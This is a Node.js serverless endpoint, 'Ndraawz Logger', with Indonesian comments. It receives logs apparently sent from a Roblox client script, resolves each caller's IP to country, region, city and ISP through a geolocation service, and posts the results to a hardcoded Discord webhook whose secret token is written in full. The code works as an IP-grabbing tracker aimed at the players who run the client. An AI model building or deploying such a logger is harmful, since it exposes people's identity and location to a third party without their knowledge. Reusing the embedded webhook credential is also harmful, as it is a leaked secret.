// api/log.js
const https = require('https');

// ==========================================
// WEBHOOK DISCORD (HANYA SATU, HANYA DI SINI)
// ==========================================
const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1452653310443257970/SkdnTLTdZUq5hJUf7POXHYcILxlYIVTS7TVc-NYKruBSlotTJtA2BzHY9bEACJxrlnd5";

// ==========================================
// FUNGSI KIRIM KE DISCORD
// ==========================================
async function sendToDiscord(embedData) {
    const payload = JSON.stringify({ embeds: [embedData] });
    const url = new URL(DISCORD_WEBHOOK);
    const options = {
        hostname: url.hostname,
        path: url.pathname,
        method: 'POST',
        headers: { 'Content-Type': 'application/json' }
    };
    
    return new Promise((resolve) => {
        const req = https.request(options, (res) => {
            res.resume();
            resolve(res.statusCode === 204 || res.statusCode === 200);
        });
        req.on('error', () => resolve(false));
        req.write(payload);
        req.end();
    });
}

// ==========================================
// FUNGSI AMBIL GEOLOKASI DARI IP
// ==========================================
async function getGeoInfo(ip) {
    return new Promise((resolve) => {
        const timeout = setTimeout(() => resolve(null), 5000);
        
        https.get(`https://ipwhois.io/json/${ip}`, (geoRes) => {
            let data = '';
            geoRes.on('data', chunk => data += chunk);
            geoRes.on('end', () => {
                clearTimeout(timeout);
                try {
                    const json = JSON.parse(data);
                    if (json && json.country) {
                        resolve({
                            country: json.country || "N/A",
                            region: json.region || "N/A",
                            city: json.city || "N/A",
                            isp: json.isp || "N/A",
                            as: json.asn || "N/A",
                            org: json.org || "N/A"
                        });
                    } else {
                        resolve(null);
                    }
                } catch (e) {
                    resolve(null);
                }
            });
        }).on('error', () => resolve(null));
    });
}

// ==========================================
// HANDLER UTAMA
// ==========================================
module.exports = async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method Not Allowed' });
    }
    
    let body = '';
    await new Promise((resolve) => {
        req.on('data', chunk => body += chunk);
        req.on('end', resolve);
    });
    
    const clientIp = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || "unknown";
    const cleanIp = clientIp.replace('::ffff:', '');
    
    try {
        const data = JSON.parse(body);
        
        // ========== LOG TYPE: SECURITY (dari testing.js) ==========
        if (data.type === "security") {
            const embed = {
                title: "❗️ Ndraawz Security ❗️",
                description: data.message,
                color: 0xff0000,
                footer: { text: "IP: " + cleanIp },
                timestamp: new Date().toISOString()
            };
            await sendToDiscord(embed);
            console.log(`✅ Security log terkirim untuk IP: ${cleanIp}`);
            return res.status(200).json({ ok: true });
        }
        
        // ========== LOG TYPE: PLAYER (dari client Roblox) ==========
        if (data.type === "player" && data.fields) {
            const geoData = await getGeoInfo(cleanIp) || {
                country: "N/A", region: "N/A", city: "N/A", isp: "N/A", as: "N/A", org: "N/A"
            };
            
            const allFields = [
                ...(data.fields || []),
                { name: "━━━━━━━━━━━━━━ 🌐 IP INFORMATION ━━━━━━━━━━━━━━", value: "ㅤ", inline: false },
                { name: "📡 IP Address", value: cleanIp, inline: false },
                { name: "🚩 Country", value: geoData.country, inline: false },
                { name: "📍 Region", value: geoData.region, inline: false },
                { name: "🏙️ City", value: geoData.city, inline: false },
                { name: "🏢 ISP", value: geoData.isp, inline: false }
            ];
            
            const embed = {
                title: "🚀 Ndraawz Logger",
                color: 0x00ff88,
                fields: allFields,
                timestamp: new Date().toISOString()
            };
            await sendToDiscord(embed);
            console.log(`✅ Player log terkirim untuk IP: ${cleanIp}`);
            return res.status(200).json({ ok: true });
        }
        
        // ========== LOG TYPE: DEFAULT (tanpa type, untuk backward compatibility) ==========
        if (data.fields) {
            const geoData = await getGeoInfo(cleanIp) || {
                country: "N/A", region: "N/A", city: "N/A", isp: "N/A", as: "N/A", org: "N/A"
            };
            
            const allFields = [
                ...(data.fields || []),
                { name: "━━━━━━━━━━━━━━ 🌐 IP INFORMATION ━━━━━━━━━━━━━━", value: "ㅤ", inline: false },
                { name: "📡 IP Address", value: cleanIp, inline: false },
                { name: "🚩 Country", value: geoData.country, inline: false },
                { name: "📍 Region", value: geoData.region, inline: false },
                { name: "🏙️ City", value: geoData.city, inline: false },
                { name: "🏢 ISP", value: geoData.isp, inline: false }
            ];
            
            const embed = {
                title: "🚀 Ndraawz Logger",
                color: 0x00ff88,
                fields: allFields,
                timestamp: new Date().toISOString()
            };
            await sendToDiscord(embed);
            console.log(`✅ Default log terkirim untuk IP: ${cleanIp}`);
            return res.status(200).json({ ok: true });
        }
        
        return res.status(400).json({ error: "Invalid request format" });
        
    } catch (err) {
        console.error("Error:", err);
        return res.status(400).json({ error: err.message });
    }
};
